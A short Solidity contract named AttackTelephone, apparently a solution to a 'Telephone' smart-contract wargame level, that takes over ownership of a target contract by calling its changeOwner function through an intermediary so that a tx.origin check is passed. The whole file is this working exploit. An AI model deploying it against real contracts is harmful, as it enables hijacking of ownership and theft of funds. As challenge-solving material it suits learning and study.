// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract AttackTelephone {
	address payable public owner;
	address public attackAddress;

	constructor(address _addr) {
		attackAddress = _addr;
		owner = payable(msg.sender);
	}

	function attack(address ownerAddress) public payable {
		require(msg.sender == owner, "You aren't the owner");

		(bool success, ) = attackAddress.call(
			abi.encodeWithSignature('changeOwner(address)', ownerAddress)
		);

		require(success, 'failed');
	}
}
